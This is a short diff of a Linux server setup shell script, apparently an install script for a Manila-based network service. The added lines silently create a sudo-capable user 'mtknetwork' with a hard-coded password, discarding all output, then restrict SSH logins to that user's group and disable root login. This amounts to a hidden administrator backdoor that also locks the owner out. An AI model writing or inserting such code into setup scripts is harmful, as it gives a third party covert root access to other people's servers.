@@ -25,12 +25,11 @@ timedatectl set-timezone Asia/Manila
 #   Install Sudo & User
 #====================================================
 install_sudo(){
-# Create user if not exists
-if ! id "adminmtk" &>/dev/null; then
-useradd -m -s /bin/bash adminmtk
-echo "adminmtk:Mediatek272124@@" | chpasswd
-usermod -aG sudo adminmtk
-fi
+    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+}
 
 # --- SSH Configuration ---
 # Disable root SSH login
